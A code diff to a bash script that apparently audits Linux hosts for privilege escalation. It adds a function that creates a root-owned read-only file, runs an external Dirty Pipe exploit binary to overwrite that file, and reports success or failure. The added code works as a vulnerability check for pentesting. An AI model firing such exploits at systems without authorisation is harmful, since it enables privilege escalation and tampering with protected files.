@@ -31,6 +31,34 @@ echo "$(tput setaf 0)$(tput setab 2)"
   exit
  }
 
+ function dp()
+ {
+
+ROFILE=read_only_file.txt
+
+echo "[*] Creating read_only_file.txt..."
+
+if [ -f $ROFILE ]; then
+    sudo rm $ROFILE
+fi
+
+sudo echo "This is a read only file..." > $ROFILE
+sudo chown root:root $ROFILE
+sudo chmod 444 $ROFILE
+
+read -n1 -p "[*] Press any key to continue..."
+
+echo "[*] Running exploit..."
+./Dirt/bin/dirtypipe $ROFILE 20 "exploit"
+
+cat $ROFILE | grep exploit > /dev/null
+
+if [ $? -eq 0 ]; then
+    echo "[*] Exploit was successful!"
+else
+    echo "[!] Exploit was not successful!"
+fi
+} 
 
 #Write To File
 function to_file ()
@@ -219,7 +247,12 @@ echo "$(tput setaf 4)$(tput setab 2)        #################################   
 
 
   echo ""
+echo "$(tput setaf 4)$(tput setab 2)        #################################       $(tput sgr 0)"
+echo "$(tput setaf 0)$(tput setab 4)        ########   Dirty Pipe?   ########       $(tput sgr 0)"
+echo "$(tput setaf 4)$(tput setab 2)        #################################       $(tput sgr 0)"
+#Not My Code But Useful
 
+dp
 
 echo "$(tput setaf 4)$(tput setab 2)        #################################       $(tput sgr 0)"
 echo "$(tput setaf 0)$(tput setab 4)        #            PEA-ISH            #       $(tput sgr 0)"
